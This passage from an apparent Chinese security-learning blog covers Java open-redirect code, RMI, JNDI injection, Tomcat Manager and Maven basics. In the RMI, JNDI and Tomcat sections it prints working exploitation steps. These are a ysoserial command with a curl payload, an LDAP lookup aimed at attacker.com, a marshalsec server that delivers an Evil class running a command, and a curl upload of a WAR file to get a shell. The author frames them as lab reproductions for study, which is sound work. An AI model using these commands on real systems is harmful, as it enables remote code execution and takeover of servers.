* * @author JoyChou (joychou@joychou.org) * @version 2017.12.28 */@Controller@RequestMapping(\"/urlRedirect\")public class URLRedirect &#123; /** * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com */ @GetMapping(\"/redirect\") public String redirect(@RequestParam(\"url\") String url) &#123; return \"redirect:\" + url; &#125; /** * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com */ @RequestMapping(\"/setHeader\") @ResponseBody public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123; String url = request.getParameter(\"url\"); response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect response.setHeader(\"Location\", url); &#125; /** * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com */ @RequestMapping(\"/sendRedirect\") @ResponseBody public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String url = request.getParameter(\"url\"); response.sendRedirect(url); // 302 redirect &#125; /** * Safe code. Because it can only jump according to the path, it cannot jump according to other urls. * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test */ @RequestMapping(\"/forward\") @ResponseBody public static void forward(HttpServletRequest request, HttpServletResponse response) &#123; String url = request.getParameter(\"url\"); RequestDispatcher rd = request.getRequestDispatcher(url); try &#123; rd.forward(request, response); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * Safe code of sendRedirect. * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com */ @RequestMapping(\"/sendRedirect/sec\") @ResponseBody public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String url = request.getParameter(\"url\"); if (SecurityUtil.checkURL(url) == null) &#123; response.setStatus(HttpServletResponse.SC_FORBIDDEN); response.getWriter().write(\"url forbidden\"); return; &#125; response.sendRedirect(url); &#125;&#125; 这一部分更多是安全编程的问题。如果重定向出现问题就很有可能会与xss等漏洞联系起来。此处恶意代码中,任意url都可以通过setHeader,sendRedirect导致重定向。限制方法则如最后两个解决措施,限制只能在path间调转或者直接写好SecurityUtil来限制调转的url. java-rmi 最早接触到rmi是在复现vulhub上fastjson漏洞时学到的,使用jndi注入时用到rmi://或jndi://。现在来学习下rmi的具体使用， RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。 Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。 design-pattern 设计模式包含三个部分：1.Registry。Server端向Registry注册服务,Client端从Registry获取远程对象的一些信息并进行调用。2.Server 提供远程方法3.Client 使用远程方法 interaction 1.首先，启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）2.其次，Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称3.最后，Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称），使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Service那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法 dynamic class loading 一个非常重要的点。rmi支持我们在没有某个类定义时前去下载远程类。这也是jndi与反序列化应用的主要手段。动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。同样实现了动态加载。 coding 下面来写个demo。还是按照mi1k7ea师傅的实例写法写下。 服务端远程调用的类Identity 123456789101112131415161718192021222324252627282930313233import java.io.Serializable;public class Identity implements Serializable&#123; private int id; private String name; private int age; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125; 因为顾及到开发习惯,所以成员变量都是私有的。自然调用时也要有对应的setter,getter方法。idea支持直接alt+enter添加选中属性的setter和getter方法。 然后是一个远程接口，ServiceImpl.class 1234567import java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface Service extends Remote&#123; public List&lt;Identity&gt; GetList() throws RemoteException;&#125; 远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误然后是接口的实现类 12345678910111213141516171819202122232425262728293031import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.LinkedList;import java.util.List;public class ServiceImpl extends UnicastRemoteObject implements Service&#123; public ServiceImpl() throws RemoteException &#123; super(); &#125; @Override public List&lt;Identity&gt; GetList() throws RemoteException &#123; System.out.println(\"Get Identity Start!\"); List&lt;Identity&gt; personlist =new LinkedList&lt;Identity&gt;(); Identity person1 = new Identity(); person1.setId(0); person1.setName(\"byc\"); person1.setAge(20); personlist.add(person1); Identity person2 = new Identity(); person2.setId(1); person2.setName(\"Joe\"); person2.setAge(18); personlist.add(person2); return personlist; &#125;&#125; 注意这里构造方法也要throw RemoteException.然后类建完后开始会报错说我们没有实现GetList()方法。这里直接点到报错的位置,它会自动提供我们一个重写的GetList()方法 下面是一个把Server和Registry的创建、对象绑定注册表写到一块的Program代码 12345678910111213141516import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class Program &#123; public static void main(String[] args) &#123; try &#123; Service personService =new ServiceImpl(); LocateRegistry.createRegistry(6666); Naming.rebind(\"rmi://127.0.0.1:6666/PersonService\", personService); System.out.println(\"Service Start!\"); &#125; catch (Exception e ) &#123; e.printStackTrace(); &#125; &#125;&#125; 客户端通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来 12345678910111213141516import java.rmi.Naming;import java.util.List;public class Client &#123; public static void main(String[] args) &#123; try &#123; Service personService =(Service) Naming.lookup(\"rmi://127.0.0.1:6666/PersonService\"); List&lt;Identity&gt; personList=personService.GetList(); for(Identity person:personList)&#123; System.out.println(\"ID:\"+person.getId()+\" Age:\"+person.getAge()+\" Name:\"+person.getName()); &#125; &#125; catch (Exception ex)&#123; ex.printStackTrace(); &#125; &#125;&#125; 同样是使用ctrl+alt+t添加try catch语句环绕中间rmi部分语句。先启动rmiserver.然后客户端调用方法。 几个函数的使用 123456bind(String name, Object obj)：注册对象，把对象和一个名字name绑定rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象//前者则会抛出NameAlreadyBoundException错误lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象； exploit Java 1.8.121版本以下 1java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target_ip 1099 CommonsCollections1 \"curl xxxx\" Java 1.8.121版本及以上：重写个class,扔到ysoserial里重新编译https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI这样相当于加了个利用类。然后继续打就行了 发现vulhub原来有javarmi的两个镜像。自己仓库太久没更新导致疏忽了。 我们来看看jdk高版本时做出的改变 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; 所以利用时是通过白名单里可利用的类来进行反序列化。因为rmi在其他洞里出现的频率也很高。所以学习到其他漏洞时也会提及。 jndi注入jndi注入的使用在shiro与fastjson的反序列化复现中都曾经使用过。想要真正理解这几种漏洞的脉络,还是得先把jndi的相关知识学懂。 jndi JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等 所以说jndi的作用主要在于”定位”。比如定位rmi中注册的对象,访问ldap的目录服务等等。 demo 其使用与rmi很类似 12bind：将名称绑定到对象中；lookup：通过名字检索执行的对象 下面是写的demo 1234567891011121314151617181920212223242526272829303132333435363738import java.io.Serializable;import java.rmi.Remote;public class Identity implements Remote,Serializable&#123; private int id; private String name; private int age; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String toString()&#123; return \"id: \"+id+\" name: \"+name+\" age: \"+age; &#125;&#125; 与上面rmi的Identity类不同的是,这里我们必须让它继承java.rmi.Remote类.否则会抛出错误。同时加上一个toString()方法方便我们获取并打印对象的属性。 一个服务端+客户端的整合代码。先用jndi的bind将Identity对象绑定在rmi服务中。然后再lookup检索对象输出。JndiServer 123456789101112131415161718192021222324252627282930313233343536import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;public class JndiServer &#123; public static void initIdentity() throws Exception&#123; LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); InitialContext ctx = new InitialContext(); Identity a= new Identity(); a.setId(0); a.setAge(20); a.setName(\"byc_404\"); ctx.bind(\"person\",a); ctx.close(); &#125; public static void getIdentity() throws Exception&#123; InitialContext ctx = new InitialContext(); Identity person = (Identity) ctx.lookup(\"person\"); System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception&#123; initIdentity(); getIdentity(); &#125;&#125; 注意我们需要先行设置jndi工厂的url及端口等等属性。 traits of jndi jndi存在安全管理器.对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制： 可以看到ldap对应的安全措施并非强制的。这点非常有意思。进而延伸到我们下面的一个特点 jndi在初始化时,一定要像demo中那样配置上下文环境。 1234567891011Properties env = new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\");env.put(Context.PROVIDER_URL,\"rmi://localhost:1099\");Context ctx = new InitialContext(env);LocateRegistry.createRegistry(6666);System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\");System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\");InitialContext ctx = new InitialContext(); 上面两种方式都可以指定上下文。但是当我们使用lookup()寻找对象时,我们可以用其他格式的协议来转换上下文环境访问对象。具体可以跟到InitialContext类的getURLOrDefaultInitCtx 1234567891011121314protected Context getURLOrDefaultInitCtx(String name) throws NamingException &#123; if (NamingManager.hasInitialContextFactoryBuilder()) &#123; return getDefaultInitCtx(); &#125; String scheme = getURLScheme(name); if (scheme != null) &#123; Context ctx = NamingManager.getURLContext(scheme, myProps); if (ctx != null) &#123; return ctx; &#125; &#125; return getDefaultInitCtx(); &#125; 可以看到如果协议不为空,会重新获取url中指定的环境。所以可以传递ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);这样的url来进行lookup.(幸好之前做htb好好学了下ldap……).这就是jndi的动态协议转换特性。 jndi injection 终于到我们攻击的重头戏jndi注入了。不过在正式开始前我们还需要了解下Reference类的使用 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等 几个比较关键的属性： 1.className：远程加载时所使用的类名2.classFactory：加载的class中需要实例化类的名称3.classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议 所以我们开始jndi注入时,就可以使用到Reference类的功能了。jndi中对象的传递可以使用序列化也可以使用引用。那么假如我们能将恶意的Reference类绑定在RMI注册表中,并试其引用指向恶意class.就能达成命令执行。(前提:当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时) 复现的话因为我本地java版本的问题导致不能用基础的jndi注入payload打。不过之前我复现过fastjson的洞。用的就是rmi的服务 方法,对应jdk1.8以下的,直接用rmi做 JndiClient 12345678910import javax.naming.Context;import javax.naming.InitialContext;public class JndiClient &#123; public static void main(String[] args) throws Exception&#123; String uri = \"rmi://127.0.0.1:1099/aa\";//可控 Context ctx = new InitialContext(); ctx.lookup(uri); &#125;&#125; 用marshalsec起一个rmi服务java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Evil 准备的Evil.java javac Evil.java编译好.并起一个python web服务监听在对应的端口 12345678public class Evil &#123; public Evil() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"touch\",\"/tmp/a\"&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125;&#125; 不过我因为版本问题所以都失败了。可以看到其抛出的com.sun.jndi.rmi.object.trustURLCodebase错误。 这也就是为什么上面提到说ldap。LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。 我们换用ldap的命令试试 CLIENT.java 123456789101112import javax.naming.Context;import javax.naming.InitialContext;import javax.swing.*;public class CLIENT &#123; public static void main(String[] args) throws Exception &#123; String uri = \"ldap://127.0.0.1:1389/aa\"; Context ctx = new InitialContext(); ctx.lookup(uri); &#125;&#125; marshalsec起服务。evil.class准备弹shell成功执行命令。可以看到ldap的版本使用范围确实比rmi更广。 这里还有一个绕过高版本的jndi注入。属于进阶技巧了。暂时先留个坑。等遇到再填。 develop上面基本上是把java的一些比较基础的漏洞或多或少复现并分析了一遍。感觉接触起来还是挺有意思的。不过按照之前的计划,现在要把java_web的知识更深入了解下。方便自己以后更熟悉文件结构或者相应的方法,同时也是为了开发做进一步考虑。至于java一些常见漏洞如jackson,fastjson以及其他一些框架如struts的漏洞等等方向的深入就留到后面其他文章里记录了。 tomcatweb资源想要被远程计算机访问,都需要一个与之进行网络通信的程序。web服务器就是这样的程序。对java而言,支持全部JSP以及Servlet规范的tomcat服务器是最好的选择。tomcat的下载安装就不多赘述了。按照教程走就好。 这里对tomcat的一些细节进行叙述 $CATALINA_HOME tomcat的根目录。我们也可以通过配置$CATALINA_BASE,为多个tomcat实例的个体设定对应的属性。 path /bin存放用于启动及关闭的文件，以及其他一些脚本。其中，UNIX 系统专用的 *.sh 文件在功能上等同于 Windows 系统专用的 *.bat 文件 /conf配置文件及相关的 DTD。其中最重要的文件是 server.xml，这是容器的主配置文件当然其他一些文件也很重要。个人遇到过的还有catalina.policy,tomcat-users.xml,web.xml这几个重要配置文件。 /log日志文件的默认目录。 /webapps存放 Web 应用的相关文件。 应用部署 在 Tomcat 服务器上，可以通过多种方法部署 Web 应用:1.静态部署2.动态部署 静态部署我们应该很熟悉。就是常规的开发流程。在启动之前就写好web应用。但是动态部署可能就接触的相对较少。但其实就是使用tomcatmanager直接操作管理web应用。 关于tomcat manager要等到专门讲manager时再仔细理解。 上下文 上下文在 Tomcat 中其实就是 Web 应用的意思。为了在 Tomcat 中配置上下文，需要用到上下文描述符文件。在tomcat中其实就是xml文件。上下文描述符文件位于：1.$CATALINA_BASE/conf/[enginename]/[hostname]/[webappname].xml2.$CATALINA_BASE/webapps/[webappname]/META-INF/context.xml在目录 1 中的文件名为 [webappname].xml，但在目录 2 中，文件名为 context.xml。如果某个 Web 应用没有相应的上下文描述符文件，Tomcat 就会使用默认值配置该应用。 Tomcat Manager 很多生产环境都非常需要以下特性：在无需关闭或重启整个容器的情况下，部署新的 Web 应用或者取消对现有应用的部署。或者，即便在 Tomcat 服务器配置文件中没有指定 reloadable 的情况下，也可以请求重新加载现有应用。 Tomcat 中的 Web 应用 Manager 就是来解决这些问题的，它默认安装在上下文路径：/manager 中 Tomcat 以默认值运行是非常危险的，因为这能让互联网上的任何人都可以在你的服务器上执行 Manager 应用。因此，Manager 应用要求任何用户在使用前必须验证自己的身份，提供自己的用户名和密码，以及相应配置的 manager-** 角色（角色名称根据所需的功能而定）。另外，默认用户文件（$CATALINA_BASE/conf/tomcat-users.xml）中的用户名称都没有指定角色名称，所以默认是不能访问 Manager 应用的。 这些角色名称位于 Manager 应用的 web.xml 文件中。可用的角色包括： manager-gui 能够访问 HTML 界面。manager-status 只能访问“服务器状态”（Server Status）页面。manager-script 能够访问文档中描述的适用于工具的纯文本界面，以及”服务器状态”页面。manager-jmx 能够访问 JMX 代理界面以及“服务器状态”（Server Status）页面。 为了能够访问 Manager 应用，必须创建一个新的用户名/密码组合，并为之授予一种 manager-** 角色，或者把一种 manager-** 角色授予现有的用户名/密码组合 比较危险的情况就如之前曾经做过几次的java题中出现的tomcat弱密码部署war或者tomcat密码泄露,命令行部署war的情况一样。 注意一点,tomcat支持通过请求url进行命令执行。http://{host}:{port}/manager/text/{command}?{parameters} 比如我做过的htb某靶机中,用户密码泄露了。但是用户是admin-gui,manager-script权限,我们没法通过账户密码登录manager/html手动部署war.但是却可以通过命令行来部署war getshell. 1curl --user 'tomcat:xxxx' --upload-file exp.war \"http://xxxx:8080/manager/text/deploy=/exp.war\" 这样就可以通过访问web目录exp直接操作shell了。 安全管理 Java 的 SecurityManager 能让 Web 浏览器在它自身的沙盒中运行小型应用（applet），从而具有防止不可信代码访问本地文件系统的文件以及防止其连接到主机，而不是加载该应用的位置。SecurityManager 能防止不可信的小型应用在你的浏览器上运行，运行 Tomcat 时，使用 SecurityManager 也能保护服务器，使其免受木马型的 applet、JSP、JSP Bean 以及标签库的侵害，甚至也可以防止由于无意中的疏忽所造成的问题。 关于适用于 Tomcat 的标准系统 SecurityManager 权限类.包括但不限于：1.java.lang.RuntimePermission——控制一些系统/运行时函数的使用，比如 exit() 和 exec()。 另外也控制包的访问/定义。2.java.io.FilePermission——控制对文件和目录的读/写/执行。3.java.security.AllPermission——允许访问任何权限，仿佛没有 SecurityManager。…… 其对应的策略文件就是catalina.policy。 ServletServlet算是javaweb比较特色的程序了。它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。从某种角度讲,他能跟php做到的功能近乎类似。Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。 Life Cycle Servlet的生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程： 1.通过调用 init () 方法进行初始化。2.调用 service() 方法来处理客户端的请求。3.通过调用 destroy() 方法终止（结束）。最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。 init()可理解为初始化,但不是构造方法。(java构造方法必须是跟类名同名的)一般进行简单的参数设定。 service()用来处理客户端请求并将格式化的响应返回给客户端。我们通常并不需要对这个方法进行改善,而是重写其调用的doGet,doPost等方法。 doGet(),doPost()格式均如下： 1234public void [doGet or doPost](HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123; // Servlet code&#125; destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收 部署 这一部分应该算是web开发的基本流程了,因为以前只是审过源码,所以在实际使用idea进行项目创建以及内容编写上还是得重新来过。 流程:idea创建javaEnterprise项目并选择Additional Library中的Web Application. =&gt; 在新建项目下的web/WEB-INF目录下新建lib,src,classes三个文件夹 =&gt; 更改项目结构： 1.src 可以在Project Structure的modules中重新设置source.我们需要把Sources从原工程的src改为WEB-INF下的src.Sources 一般用于标注类似 src 这种可编译目录。有时候我们不单单项目的 src 目录要可编译，还有其他一些特别的目录也许我们也要作为可编译的目录，就需要对该目录进行此标注。只有 Sources 这种可编译目录才可以新建 Java 类和包。(此处工程自己创建的src没用了，所以我们直接改成web目录下的源文件夹)2.classes 用来存放编译后输出的class文件.我们同样在项目结构中Paths的配置里将Output path和Test output path都选择刚刚创建的classes文件夹。3.lib用于外部jar包。由于我们开发时必然会用到外部依赖,所以存放jar包的lib也需要在项目中设置。我们同样在modules中把lib添加为jar directory即可。 然后是配置tomcat服务器,这个没啥好说的。不过还是要注意artifact设置根目录的要点。通常设置为/. Servlet编写的一个demo.我们首先要在之前更改过的src下新建一个class(虽然idea会自动换成.java)命名随意。不过最好是某某Servlet. 12345678910111213141516171819202122232425262728293031import java.io.*;import javax.servlet.*;import javax.servlet.http.*;public class TestServlet extends HttpServlet&#123; private String quote; public TestServlet()&#123; System.out.println(\"TestServlet constructor called.\"); &#125; @Override public void init() throws ServletException &#123; System.out.println(\"TestServlet init method called\"); quote=\"Thy will , not my will , be done.\"; &#125; @Override public void destroy() &#123; System.out.println(\"TestServlet destroy method called\"); &#125; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; resp.setContentType(\"json\"); PrintWriter out=resp.getWriter(); out.println(\"&#123;\\\"quote\\\":\\\"\"+quote+\"\\\"&#125;\"); &#125;&#125; 这里顺手写了构造方法看看调用顺序。虽然我们都知道构造方法必然是最先调用的，其次是init(),然后是我们每次访问时调用的doGet,最后destroy销毁。 然后我们build module。在WEB-INF下的classes中生成TestServlet.class.最后就是配置web.xml了。 默认情况下，Servlet 应用程序位于路径 /webapps/ROOT 下，且类文件放在 /webapps/ROOT/WEB-INF/classes 中。如果有一个完全合格的类名称 com.myorg.MyServlet，那么这个 Servlet 类必须位于 WEB-INF/classes/com/myorg/MyServlet.class 中。位于 /webapps/ROOT/WEB-INF/ 的 web.xml 文件中必须设置Servlet的相关条目。 所以路径结构规定其实非常清晰。接下来我们只需要设置web.xml 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt; &lt;servlet&gt; &lt;servlet-name&gt;test&lt;/servlet-name&gt; &lt;servlet-class&gt;TestServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;test&lt;/servlet-name&gt; &lt;url-pattern&gt;/Test&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 可设定对应的servlet-class并定义其servletname.同时可以定义这个servlet对应的url映射。 剩下的部分就跟其他语言差不多了,使用get,post等处理参数,cookie及相应http请求。这里稍微记录下sql连接的使用方法。 1234567891011121314151617181920static final String JDBC_DRIVER = \"com.mysql.jdbc.Driver\"; static final String DB_URL = \"jdbc:mysql://localhost:3306/test\"; static final String USER = \"root\";static final String PASS = \"123456\"; ......Class.forName(\"com.mysql.jdbc.Driver\");conn = DriverManager.getConnection(DB_URL,USER,PASS);......mt = conn.createStatement();String sql;sql = \"SELECT id, name, url FROM websites\";ResultSet rs = stmt.executeQuery(sql);......rs.close();stmt.close();conn.close(); maven之前使用ysoserial跟marshalsec时想必必然用过maven了。但是实际上maven的作用究竟是什么还是一头雾水。因此针对maven也来学习下。 what is mavenMaven 翻译为”专家”、”内行”，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。 Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。 环境配置只要jdk+下载maven即可。当然我记得IDEA应该是有maven的功能的。 POM POM 即 project object model.是一个xml文件，同时也是maven工程的基本单元。包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。 一个pom.xml的demo 12345678910111213141516&lt;project xmlns = \"http://maven.apache.org/POM/4.0.0\" xmlns:xsi = \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation = \"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;!-- 模型版本 --&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt; &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt; &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt; &lt;artifactId&gt;project&lt;/artifactId&gt; &lt;!-- 版本号 --&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/project&gt; 常见的节点理解 Super POM 父（Super）POM是 Maven 默认的 POM。所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 包含了一些可以被继承的默认设置。因此，当 Maven 发现需要下载 POM 中的 依赖时，它会到 Super POM 中配置的默认仓库 http://repo1.maven.org/maven2 去下载。 更多pom标签的含义在遇到实际情况再作说明。 Life Cycle Maven 构建生命周期定义了一个项目构建跟发布的过程.其主要的三个生命周期是clean,default/build,site. 常用命令如mvn clean执行的其实是两个生命周期阶段pre-clean,clean.换成mvn post-clean则会都执行一遍即三个阶段。 123pre-clean：执行一些需要在clean之前完成的工作clean：移除所有上一次构建生成的文件post-clean：执行一些需要在clean之后立刻完成的工作 我们可以通过控制pom.xml来决定mvn clean时每个阶段的动作。 maven repos maven仓库是项目中依赖的第三方库。其主要是存储jar的地方。因此我们可以构建本地的maven项目。当然也可以有远程与默认的仓库。 比如使用aliyun仓库。我们可以在maven的setting中更改setting.xml添加节点。 12345678&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt;&lt;/mirrors&gt; pom.xml中添加 12345678910111213&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; 这个可能算是比较重要的一点了。因为大部分idea自带的maven或者是默认下载的maven配置中settings.xml都会去国外仓库获取资源，导致速度奇慢。 develop 下面就可以开始正式maven项目的开发了。似乎idea直接创造maven project有一些坑要踩。所以我先按照菜鸟教程上的走。 在开始之前，先确认把仓库的设置改好了。即选择了aliyun镜像.然后idea的配置中: 然后用命令行构建一个项目。此处我命命为maven_learning 1mvn archetype:generate &quot;-DgroupId&#x3D;com.byc.test&quot; &quot;-DartifactId&#x3D;mvn_learning&quot; &quot;-DarchetypeArtifactId&#x3D;maven-archetype-quickstart&quot; &quot;-DinteractiveMode&#x3D;false&quot; 之后在idea中导入这个工程即可。目录结构test跟java分别是java代码文件跟测试代码文件。都在包结构下。 这里我们初始的pom.xml中主要是这样的内容 12345678&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 说明Maven 已经添加了 JUnit 作为测试框架 初始的App.java是一个Hello world的用例 12345678910111213package com.byc.test;/** * Hello world! * */public class App &#123; public static void main( String[] args ) &#123; System.out.println( \"Hello World!\" ); &#125;&#125; 接下来我们需要build maven项目。使用clean package 1mvn clean package 成功后。我们会发现生成了target文件夹。并且其中有我们项目构建的jar file。新增目录结构 123456我们给了 maven 两个目标，首先清理目标目录（clean），然后打包项目构建的输出为 jar（package）文件。打包好的 jar 文件可以在target中获得测试报告存放在surefire-reports文件夹中Maven 编译源码文件，以及测试源码文件。接着 Maven 运行测试用例。最后 Maven 创建项目包。 classes文件夹下使用java -cp . com.byc.test.App即可调用Hello world. 这是一个简单的maven项目构建过程。如果要使用外部依赖进行web相关开发,只需依照目录结构进行补充即可。假如我们需要添加一个ldapjdk.jar作为依赖。还是老样子将其拖到工程的lib文件夹下,并在pom.xml中添加 12345678910&lt;dependencies&gt; &lt;!-- 在这里添加你的依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;ldapjdk&lt;/groupId&gt; &lt;!-- 库名称，也可以自定义 --&gt; &lt;artifactId&gt;ldapjdk&lt;/artifactId&gt; &lt;!--库名称，也可以自定义--&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;!--版本号--&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;!--作用域--&gt; &lt;systemPath&gt;$&#123;basedir&#125;\\src\\lib\\ldapjdk.jar&lt;/systemPath&gt; &lt;!--项目根目录下的lib文件夹下--&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 这里一开始想用ideabuild 